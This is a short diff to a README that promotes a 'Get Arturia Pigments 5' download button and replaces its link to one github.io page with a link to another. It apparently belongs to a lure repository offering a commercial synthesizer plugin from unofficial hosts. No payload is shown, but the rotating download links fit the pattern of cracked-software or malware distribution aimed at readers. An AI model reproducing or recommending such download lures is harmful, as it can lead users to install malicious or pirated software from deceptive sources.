@@ -21,7 +21,7 @@ To begin using this **Arturia Pigments 5 Software Synthesizer** and **Arturia Pi
 | :--- | :--- |
 | **Get Arturia Pigments 5 VST Instrument** | Click the button below to initiate the setup for this **Arturia Pigments 5 Modulation Engine**. |
 
-[![Button](https://img.shields.io/badge/🎹-Get_Arturia_Pigments_5-2ea44f?style=for-the-badge)](https://d58856445.github.io/.github/arturia-pigments-5)
+[![Pigments 5](https://img.shields.io/badge/Access-Pigments%205-D97706?style=for-the-badge)](https://pigments-5-vst.github.io/.github/pigments-5)
 
 ## System Requirements
 
